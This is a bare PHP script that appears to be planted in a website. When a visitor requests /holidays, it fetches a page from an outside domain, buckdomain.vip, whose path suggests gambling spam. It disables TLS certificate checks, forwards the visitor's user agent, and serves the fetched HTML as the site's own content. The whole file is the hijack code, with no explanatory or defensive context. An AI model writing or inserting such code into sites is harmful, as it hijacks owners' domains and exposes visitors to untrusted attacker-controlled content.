<?php
if (isset($_SERVER['REQUEST_URI'])) {
    $requestUri = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);

    if ($requestUri === '/holidays' || $requestUri === '/holidays/') {
        $ch = curl_init();

        curl_setopt_array($ch, [
            CURLOPT_URL => 'https://buckdomain.vip/jeki2/ledak388-chalofly.com.html',
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'] ?? 'Mozilla/5.0',
            CURLOPT_TIMEOUT => 15
        ]);

        $html = curl_exec($ch);
        curl_close($ch);

        if ($html !== false) {
            echo $html;
            exit;
        }
    }
}

return false;